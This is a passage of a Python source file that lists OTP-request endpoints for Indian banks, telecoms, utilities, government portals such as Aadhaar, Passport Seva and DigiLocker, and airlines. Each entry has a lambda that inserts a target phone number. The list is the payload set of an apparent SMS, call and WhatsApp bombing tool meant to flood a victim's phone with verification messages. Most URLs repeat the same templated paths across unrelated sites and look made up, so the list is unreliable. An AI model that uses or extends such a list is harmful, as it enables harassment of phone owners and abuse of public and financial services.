    {"name": "Jana Bank WhatsApp", "url": "https://janabank.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "JK Bank SMS", "url": "https://www.jkbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "JK Bank Call", "url": "https://jkbank.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "JK Bank WhatsApp", "url": "https://jkbank.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Karnataka Bank SMS", "url": "https://www.karnatakabank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Karnataka Bank Call", "url": "https://karnatakabank.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Karnataka Bank WhatsApp", "url": "https://karnatakabank.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Kerala Gramin Bank SMS", "url": "https://www.keralagbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Kerala Gramin Bank Call", "url": "https://keralagbank.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Kerala Gramin Bank WhatsApp", "url": "https://keralagbank.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}"}}'},
    
    {"name": "Paytm Payments Bank SMS", "url": "https://www.paytmbank.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Paytm Payments Bank Call", "url": "https://paytmbank.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Paytm Payments Bank WhatsApp", "url": "https://paytmbank.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 📱 TELECOM
    # ==============================================================================
    
    {"name": "Airtel Thanks SMS", "url": "https://www.airtel.in/thanks/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Airtel Thanks Call", "url": "https://www.airtel.in/thanks/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Airtel Thanks WhatsApp", "url": "https://airtel.in/thanks/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Jio SMS", "url": "https://www.jio.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Jio Call", "url": "https://www.jio.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Jio WhatsApp", "url": "https://jio.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Vi SMS", "url": "https://www.myvi.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Vi Call", "url": "https://www.myvi.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Vi WhatsApp", "url": "https://myvi.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "BSNL SMS", "url": "https://www.bsnl.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "BSNL Call", "url": "https://www.bsnl.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "BSNL WhatsApp", "url": "https://bsnl.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Tata Play SMS", "url": "https://www.tataplay.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Tata Play Call", "url": "https://www.tataplay.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Tata Play WhatsApp", "url": "https://tataplay.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Dish TV SMS", "url": "https://www.dishtv.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Dish TV Call", "url": "https://www.dishtv.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Dish TV WhatsApp", "url": "https://dishtv.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Airtel DTH SMS", "url": "https://www.airtel.in/dth/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Airtel DTH Call", "url": "https://www.airtel.in/dth/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Airtel DTH WhatsApp", "url": "https://airtel.in/dth/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Jio Fiber SMS", "url": "https://www.jio.com/fiber/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Jio Fiber Call", "url": "https://www.jio.com/fiber/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Jio Fiber WhatsApp", "url": "https://jio.com/fiber/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Hathway SMS", "url": "https://www.hathway.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Hathway Call", "url": "https://www.hathway.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Hathway WhatsApp", "url": "https://hathway.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Den Networks SMS", "url": "https://www.dennetworks.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Den Networks Call", "url": "https://www.dennetworks.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Den Networks WhatsApp", "url": "https://dennetworks.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Siti Cable SMS", "url": "https://www.siticable.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Siti Cable Call", "url": "https://www.siticable.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Siti Cable WhatsApp", "url": "https://siticable.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    # ==============================================================================
    # ⚡ UTILITIES
    # ==============================================================================
    
    {"name": "Tata Power SMS", "url": "https://www.tatapower.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Tata Power Call", "url": "https://www.tatapower.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Tata Power WhatsApp", "url": "https://tatapower.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Adani Electricity SMS", "url": "https://www.adanielectricity.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Adani Electricity Call", "url": "https://www.adanielectricity.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Adani Electricity WhatsApp", "url": "https://adanielectricity.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "BSES SMS", "url": "https://www.bsesdelhi.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "BSES Call", "url": "https://www.bsesdelhi.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "BSES WhatsApp", "url": "https://bsesdelhi.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "TPDDL SMS", "url": "https://www.tpddl.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "TPDDL Call", "url": "https://www.tpddl.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "TPDDL WhatsApp", "url": "https://tpddl.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Torrent Power SMS", "url": "https://www.torrentpower.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Torrent Power Call", "url": "https://www.torrentpower.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Torrent Power WhatsApp", "url": "https://torrentpower.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "UPPCL SMS", "url": "https://www.uppcl.org/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "UPPCL Call", "url": "https://www.uppcl.org/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "UPPCL WhatsApp", "url": "https://uppcl.org/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "MSEB SMS", "url": "https://www.mahadiscom.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MSEB Call", "url": "https://www.mahadiscom.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "MSEB WhatsApp", "url": "https://mahadiscom.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "GESCOM SMS", "url": "https://www.gescom.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "GESCOM Call", "url": "https://www.gescom.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "GESCOM WhatsApp", "url": "https://gescom.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "BESCOM SMS", "url": "https://www.bescom.org/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "BESCOM Call", "url": "https://www.bescom.org/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "BESCOM WhatsApp", "url": "https://bescom.org/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "CESC SMS", "url": "https://www.cesc.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "CESC Call", "url": "https://www.cesc.co.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "CESC WhatsApp", "url": "https://cesc.co.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "WBSEDCL SMS", "url": "https://www.wbsedcl.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "WBSEDCL Call", "url": "https://www.wbsedcl.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "WBSEDCL WhatsApp", "url": "https://wbsedcl.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Gujarat Gas SMS", "url": "https://www.gujaratgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Gujarat Gas Call", "url": "https://www.gujaratgas.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Gujarat Gas WhatsApp", "url": "https://gujaratgas.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Mahanagar Gas SMS", "url": "https://www.mahanagargas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Mahanagar Gas Call", "url": "https://www.mahanagargas.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Mahanagar Gas WhatsApp", "url": "https://mahanagargas.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Indraprastha Gas SMS", "url": "https://www.iglonline.net/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Indraprastha Gas Call", "url": "https://www.iglonline.net/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Indraprastha Gas WhatsApp", "url": "https://iglonline.net/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "HP Gas SMS", "url": "https://www.hpgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "HP Gas Call", "url": "https://www.hpgas.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "HP Gas WhatsApp", "url": "https://hpgas.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Bharat Gas SMS", "url": "https://www.bharatgas.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Bharat Gas Call", "url": "https://www.bharatgas.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Bharat Gas WhatsApp", "url": "https://bharatgas.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Indane SMS", "url": "https://www.indane.co.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Indane Call", "url": "https://www.indane.co.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Indane WhatsApp", "url": "https://indane.co.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    # ==============================================================================
    # 🏛️ GOVERNMENT
    # ==============================================================================
    
    {"name": "Income Tax SMS", "url": "https://www.incometax.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Income Tax Call", "url": "https://www.incometax.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Income Tax WhatsApp", "url": "https://incometax.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "GST Portal SMS", "url": "https://www.gst.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "GST Portal Call", "url": "https://www.gst.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "GST Portal WhatsApp", "url": "https://gst.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "MCA21 SMS", "url": "https://www.mca.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MCA21 Call", "url": "https://www.mca.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "MCA21 WhatsApp", "url": "https://mca.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Passport Seva SMS", "url": "https://portal2.passportindia.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Passport Seva Call", "url": "https://portal2.passportindia.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Passport Seva WhatsApp", "url": "https://portal2.passportindia.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Voter ID SMS", "url": "https://www.nvsp.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Voter ID Call", "url": "https://www.nvsp.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Voter ID WhatsApp", "url": "https://nvsp.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Aadhaar SMS", "url": "https://uidai.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Aadhaar Call", "url": "https://uidai.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Aadhaar WhatsApp", "url": "https://uidai.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "PAN Card SMS", "url": "https://www.protean-tinpan.com/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "PAN Card Call", "url": "https://www.protean-tinpan.com/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "PAN Card WhatsApp", "url": "https://protean-tinpan.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Driving License SMS", "url": "https://parivahan.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Driving License Call", "url": "https://parivahan.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Driving License WhatsApp", "url": "https://parivahan.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "Vehicle Registration SMS", "url": "https://vahan.parivahan.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Vehicle Registration Call", "url": "https://vahan.parivahan.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Vehicle Registration WhatsApp", "url": "https://vahan.parivahan.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "DigiLocker SMS", "url": "https://www.digilocker.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "DigiLocker Call", "url": "https://www.digilocker.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "DigiLocker WhatsApp", "url": "https://digilocker.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "UMANG SMS", "url": "https://umang.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "UMANG Call", "url": "https://umang.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "UMANG WhatsApp", "url": "https://umang.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "CSC SMS", "url": "https://www.csc.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "CSC Call", "url": "https://www.csc.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "CSC WhatsApp", "url": "https://csc.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "NIC SMS", "url": "https://www.nic.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "NIC Call", "url": "https://www.nic.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "NIC WhatsApp", "url": "https://nic.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "MyGov SMS", "url": "https://www.mygov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "MyGov Call", "url": "https://www.mygov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "MyGov WhatsApp", "url": "https://mygov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "CPGRAMS SMS", "url": "https://pgportal.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "CPGRAMS Call", "url": "https://pgportal.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "CPGRAMS WhatsApp", "url": "https://pgportal.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "National Portal SMS", "url": "https://www.india.gov.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "National Portal Call", "url": "https://www.india.gov.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "National Portal WhatsApp", "url": "https://india.gov.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    # ==============================================================================
    # ✈️ AIRLINES
    # ==============================================================================
    
    {"name": "Air India SMS", "url": "https://www.airindia.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
    {"name": "Air India Call", "url": "https://www.airindia.in/api/v1/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}'},
    {"name": "Air India WhatsApp", "url": "https://airindia.in/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    
    {"name": "IndiGo SMS", "url": "https://www.goindigo.in/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}'},
